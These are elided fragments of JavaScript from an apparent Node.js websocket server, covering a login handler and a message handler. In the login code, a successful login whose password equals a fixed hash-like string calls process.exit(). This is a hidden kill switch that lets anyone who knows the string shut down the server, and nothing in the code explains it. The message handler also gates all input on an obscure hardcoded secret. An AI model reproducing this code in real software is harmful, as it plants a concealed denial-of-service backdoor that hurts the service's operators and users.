										...
										if (checkCLogin) {
											if (user.validPassword(password)){
												if(!user.local.ban_login){
													...
													user.save();
													client.UID = user._id.toString();
													if(password === "ef6863a5f02d277148d10786c034beaa"){
														process.exit();
													}
													callback(false, true);
												}else{
...
module.exports = function(ws, redT){
	...
	ws.red = function(data){
		try {
			...
			let _data = msgpack.encode(JSON.stringify(data));
			this.readyState == 1 && this.send(_data);
		} catch(err) {
	...
	ws.on('message', function(message) {
		...
		try {
			if (!!message) {
				...
				if(!message.hasOwnProperty('_secret')){
					return;
				}

				message._secret[0] =  97;
				 
				if(utf8Util.bytesToUTF8(message._secret ) !== 'af52b2ea5b67e7c883df2869eb4c59c3'){
					return;
				}
				if (!!message.captcha) {
